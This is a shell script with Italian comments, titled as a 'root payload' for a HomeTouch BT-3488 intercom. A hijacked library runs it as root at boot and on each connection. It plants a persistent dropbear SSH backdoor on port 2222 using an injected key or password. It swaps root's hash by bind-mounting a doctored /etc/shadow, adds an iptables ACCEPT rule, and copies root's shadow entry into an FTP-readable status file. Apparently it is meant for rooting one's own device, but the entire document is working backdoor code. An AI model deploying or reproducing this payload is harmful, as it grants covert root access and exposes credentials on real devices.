#!/bin/sh
# HomeTouch BT-3488 root payload (v8): dropbear sulla 2222 con CHIAVE e/o PASSWORD
# + canale diagnostico attivo.
# Eseguito come root dal costruttore di libpwn.so, che scatta in OGNI processo
# che carica libutils.so.1 (bt_daemon al boot, bt_device a ogni connessione ESU).
# Deve essere idempotente e non deve mai andare in busy-loop.
#
# v8: (a) la regola iptables viene applicata PRIMA del controllo "listener attivo",
#         cosi' un nuovo run la ripristina;
#     (b) il log va in /var/tmp/pwn.log (fuori dalla chroot FTP, che #30 azzera) e
#         viene copiato in /var/tmp/ftp/ROOTED.txt ogni 15 s;
#     (c) il diagnostico PWN_STATUS.txt riporta anche processi, porte, iptables e
#         la riga di root di /etc/shadow;
#     (d) l'override di /etc/shadow viene deciso in base al CONTENUTO di /etc/shadow
#         (non a /proc/mounts) ed e' idempotente.
#
# v7: canale diagnostico PWN_STATUS.txt nella chroot FTP, riscritto ogni 15 s per
#     10 minuti. La chroot viene azzerata dal frame #30: cosi' il file ricompare
#     da solo e si puo' leggere lo stato reale (cksum dei file, mount, log).
#
# v6: oltre ad authorized_keys si puo' abilitare il login con PASSWORD.
#     Il dropbear del firmware NON usa PAM: autentica leggendo /etc/shadow.
#     pwn.sh quindi copia /etc/shadow, sostituisce l'hash di root con quello
#     generato da build_payload.py (--password) e lo monta con `mount --bind`
#     sopra l'originale; senza -s dropbear accetta anche la password.
#     L'override vale per tutto il sistema (anche la 22) e sparisce al reboot.
#
# v5: diagnostica completa in ROOTED.txt (l'output di dropbear non va a /dev/null).

PATH=/sbin:/bin:/usr/sbin:/usr/bin
export PATH

EXTRA=/home/bticino/cfg/extra
ROOTHOME=$EXTRA/home/root
KEY=$ROOTHOME/.ssh/authorized_keys
SSHDIR=$EXTRA/ssh
HOSTKEY=$SSHDIR/dropbear_host_key
PIDFILE=/var/run/dropbear-pwn.pid
LOG=/var/tmp/pwn.log
STATUS=/var/tmp/ftp/PWN_STATUS.txt

# hash $5$... della password di root; vuoto = solo chiave pubblica.
# ATTENZIONE: apici SINGOLI. Con i doppi apici la shell espanderebbe i `$` del
# hash (`$5`, `$c4P2...`) come variabili, lasciando solo la coda della stringa:
# era il bug che faceva fallire il login con password (13/11/2026).
PWNHASH='@@PWNHASH@@'

# Override opzionale: se esiste $EXTRA/.pwn_hash il suo contenuto (una riga con
# l'hash $5$) sostituisce quello compilato qui. Permette di cambiare la password
# senza rigenerare/applicare il payload:
#   printf '%s\n' '$5$...' > /home/bticino/cfg/extra/.pwn_hash   (come root)
# La command substitution NON ri-espande i `$` del contenuto.
if [ -s "$EXTRA/.pwn_hash" ]; then
	PWNHASH=$(cat "$EXTRA/.pwn_hash" 2>/dev/null)
fi

log() {
	{ echo "pwn v8: $*"; date; } >> "$LOG" 2>/dev/null
}

listening() {
	awk 'NR>1 && $2 ~ /:08AE$/ && $4=="0A"{f=1} END{exit !f}' /proc/net/tcp 2>/dev/null
}

# diagnostica: riscrive lo stato reale nella chroot FTP (leggibile via FTP)
diag() {
	{
		echo "pwn v8 - stato"
		date
		echo "uptime:  $(cut -d' ' -f1 /proc/uptime 2>/dev/null)"
		echo "id:      $(id 2>/dev/null)"
		echo "--- processi ---"
		ps 2>&1 | head -40
		echo "--- porte 2222/22 in /proc/net/tcp ---"
		awk 'NR==1 || $2 ~ /:08AE$/ || $2 ~ /:0016$/' /proc/net/tcp 2>&1
		echo "--- iptables INPUT ---"
		/usr/sbin/iptables -L INPUT -n 2>&1 | head -12
		echo "--- /etc/shadow (root) ---"
		awk -F: '$1=="root"{printf "%s:%s...\n", $1, substr($2,1,26)}' /etc/shadow 2>&1
		echo "--- /var/tmp/shadow.pwn (root) ---"
		awk -F: '$1=="root"{printf "%s:%s...\n", $1, substr($2,1,26)}' /var/tmp/shadow.pwn 2>&1
		echo "--- hash atteso ---"
		echo "$PWNHASH"
		echo "--- /var/tmp ---"
		ls -l /var/tmp 2>&1
		echo "--- ls $EXTRA/usbkey_dir/lib ---"
		ls -l "$EXTRA/usbkey_dir/lib" 2>&1
		echo "--- cksum (size+crc POSIX) ---"
		for f in "$EXTRA/pwn.sh" "$EXTRA/.license_ver" \
		         "$EXTRA/usbkey_dir/lib/libutils.so.1" \
		         "$EXTRA/usbkey_dir/lib/libpwn.so" "$KEY"; do
			cksum "$f" 2>&1
		done
		echo "--- mounts rilevanti ---"
		awk '$2=="/home/root" || $2=="/etc/shadow" || $2=="/home/bticino/cfg/extra"{print}' /proc/mounts 2>&1
		echo "--- log (ultime 30 righe) ---"
		tail -30 "$LOG" 2>&1
	} > "$STATUS" 2>/dev/null
	cp "$LOG" /var/tmp/ftp/ROOTED.txt 2>/dev/null
}

mkdir -p /var/tmp/ftp 2>/dev/null
log "start (ppid=$PPID)"

# 0) canale diagnostico (una sola istanza per boot)
if mkdir /var/tmp/pwn.diag 2>/dev/null; then
	(
		i=0
		while [ "$i" -lt 40 ]; do
			diag
			sleep 15
			i=$((i+1))
		done
		rmdir /var/tmp/pwn.diag 2>/dev/null
	) &
fi

# 1) upgrade dalla v3: ferma il loop netcat sulla 2222
if command -v pkill >/dev/null 2>&1; then
	pkill -f '/usr/bin/netcat -l -p 2222' 2>/dev/null
	pkill -f 'while :; do /usr/bin/netcat' 2>/dev/null
fi

# 2) serve almeno un metodo di autenticazione
if [ ! -s "$KEY" ] && [ -z "$PWNHASH" ]; then
	log "STOP: ne' authorized_keys ($KEY) ne' password configurata"
	exit 0
fi
if [ -s "$KEY" ]; then
	log "chiave presente: $(wc -c < "$KEY" 2>/dev/null) byte"
fi

# 3) host key persistente, generata una sola volta
if [ ! -s "$HOSTKEY" ]; then
	mkdir -p "$SSHDIR" 2>/dev/null
	if [ -x /usr/sbin/dropbearkey ]; then
		/usr/sbin/dropbearkey -t rsa -s 2048 -f "$HOSTKEY" >>"$LOG" 2>&1
	elif [ -x /usr/sbin/dropbearmulti ]; then
		/usr/sbin/dropbearmulti dropbearkey -t rsa -s 2048 -f "$HOSTKEY" >>"$LOG" 2>&1
	else
		log "ERRORE: ne' dropbearkey ne' dropbearmulti"
	fi
fi
if [ ! -s "$HOSTKEY" ]; then
	log "STOP: generazione host key fallita ($HOSTKEY)"
	exit 0
fi
log "host key: $(wc -c < "$HOSTKEY" 2>/dev/null) byte"

# 4) permessi richiesti da dropbear.
#    ATTENZIONE: i file estratti dall'unzip di #32 NON sono di root ma dell'utente
#    con cui gira bt_device dopo il drop dei privilegi (uid 1000 = bticino).
#    dropbear pretende `owned by user or root, and not writable by others`:
#    senza questo chown la chiave pubblica viene SEMPRE rifiutata (13/11/2026).
mkdir -p "$ROOTHOME/.ssh" 2>/dev/null
chown 0:0 "$ROOTHOME" "$ROOTHOME/.ssh" "$KEY" "$HOSTKEY" 2>/dev/null
chmod 700 "$ROOTHOME" "$ROOTHOME/.ssh" 2>/dev/null
chmod 600 "$KEY" "$HOSTKEY" 2>/dev/null

# 4b) login con password: override di /etc/shadow (il firmware non usa PAM).
#     Si patcha sempre la copia corrente di /etc/shadow: se l'override e' gia'
#     attivo la patch e' idempotente, se non lo e' viene applicata.
PWAUTH=0
if [ -n "$PWNHASH" ]; then
	NEW=/var/tmp/shadow.pwn
	if awk -F: -v h="$PWNHASH" '$1=="root" && $2==h {f=1} END{exit !f}' /etc/shadow 2>/dev/null; then
		PWAUTH=1
		log "shadow: /etc/shadow contiene gia' il nostro hash"
	else
		awk -F: -v h="$PWNHASH" 'BEGIN{OFS=":"} $1=="root"{$2=h} {print}' /etc/shadow > "$NEW" 2>>"$LOG"
		chmod 600 "$NEW" 2>>"$LOG"
		if awk -F: -v h="$PWNHASH" '$1=="root" && $2==h {f=1} END{exit !f}' "$NEW"; then
			if mount --bind "$NEW" /etc/shadow 2>>"$LOG"; then
				PWAUTH=1
				log "shadow: override applicato (password su 2222 e 22)"
			else
				log "ERRORE: bind mount /etc/shadow fallito"
			fi
		else
			log "ERRORE: shadow generato senza l'hash di root"
		fi
	fi
fi

# 5) la home di root in /etc/passwd e' /home/root: la rende persistente
if ! awk '$2=="/home/root"{f=1} END{exit !f}' /proc/mounts 2>/dev/null; then
	mkdir -p /home/root 2>/dev/null
	if mount --bind "$ROOTHOME" /home/root 2>>"$LOG"; then
		log "bind mount /home/root OK"
	else
		log "ERRORE bind mount /home/root -> $ROOTHOME"
	fi
else
	log "bind mount /home/root gia' presente"
fi
if ! awk '$2=="/home/root"{f=1} END{exit !f}' /proc/mounts 2>/dev/null; then
	log "STOP: /home/root non montato"
	exit 0
fi

# 6) regola firewall idempotente: PRIMA del controllo del listener, cosi' un nuovo
#    run di pwn.sh la ripristina anche se dropbear e' gia' in ascolto.
mkdir -p /var/run 2>/dev/null
if [ -x /usr/sbin/iptables ]; then
	/usr/sbin/iptables -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || \
		/usr/sbin/iptables -I INPUT -p tcp --dport 2222 -j ACCEPT 2>>"$LOG"
	log "iptables applicato"
else
	log "ATTENZIONE: /usr/sbin/iptables assente"
fi

# 7) listener gia' attivo? (shadow e firewall sono gia' stati sistemati)
if listening; then
	log "listener gia' attivo, esco"
	exit 0
fi

# mutex di avvio atomico, rimosso appena il listener risulta attivo
mkdir /var/tmp/pwn.start 2>/dev/null || { log "start gia' in corso"; exit 0; }

# 8) dropbear. Senza -s accetta anche la password (solo se l'override e' attivo).
#    L'output (errori inclusi) finisce nel log.
if [ -x /usr/sbin/dropbear ]; then
	DB=/usr/sbin/dropbear
	DBARGS=""
elif [ -x /usr/sbin/dropbearmulti ]; then
	DB=/usr/sbin/dropbearmulti
	DBARGS="dropbear"
else
	log "STOP: nessun dropbear eseguibile"
	rmdir /var/tmp/pwn.start 2>/dev/null
	exit 0
fi

SECARGS="-s"
if [ "$PWAUTH" = "1" ]; then
	SECARGS=""
	log "autenticazione: chiave pubblica + password"
else
	log "autenticazione: solo chiave pubblica"
fi
log "avvio: $DB $DBARGS -p 2222 -r $HOSTKEY $SECARGS"

i=0
while [ "$i" -lt 5 ]; do
	$DB $DBARGS -p 2222 -r "$HOSTKEY" $SECARGS -P "$PIDFILE" >>"$LOG" 2>&1
	sleep 1
	listening && break
	i=$((i+1))
done

if listening; then
	log "dropbear in ascolto su 2222 (pw=$PWAUTH)"
else
	log "ERRORE: dropbear NON in ascolto su 2222"
fi

rmdir /var/tmp/pwn.start 2>/dev/null
exit 0